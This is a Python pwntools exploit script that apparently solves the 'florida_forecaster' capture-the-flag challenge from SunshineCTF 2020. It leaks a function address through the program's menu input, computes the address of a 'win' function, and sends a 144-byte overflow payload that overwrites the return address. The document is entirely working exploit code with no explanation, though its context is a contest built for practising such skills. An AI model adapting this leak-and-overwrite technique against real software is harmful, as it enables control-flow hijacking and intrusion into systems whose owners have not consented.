from pwn import *

exe = ELF("florida_forecaster.debug")
context(binary=exe)

LEAK_OFFSET = exe.symbols["win"] - exe.symbols["vulnerable_function"]

def read_prompt(target):
  return target.recvuntil(': ')
  
def leak_address(target):
  read_prompt(target)
  target.sendline('3')
  read_prompt(target)
  target.sendline('1061109567')
  read_prompt(target)
  target.sendline('-1')
  vuln_func_addr = int(target.readline(), 16)
  print "leaked addr: 0x%x" % vuln_func_addr
  return vuln_func_addr

def exploit(target, dest_addr):
  read_prompt(target)
  target.sendline('2')
  target.recvuntil('Enter test data\n')
  c = chr(dest_addr & 0xff)
  if c == '\n':
    dest_addr += 4 #skip prologue
  elif c.isspace():
    dest_addr += 1
  target.sendline('A'*144 + p64(dest_addr) + p8(8))
  print "Wait for flag..."
  print target.recvall()

if __name__ == '__main__':
#  t = process('./florida_forecaster')
#  t = gdb.debug('./stoplight')
  t = remote('chal.2020.sunshinectf.org', 20002)

  vuln_func_addr = leak_address(t)
  win_addr = vuln_func_addr + LEAK_OFFSET
  exploit(t, win_addr)
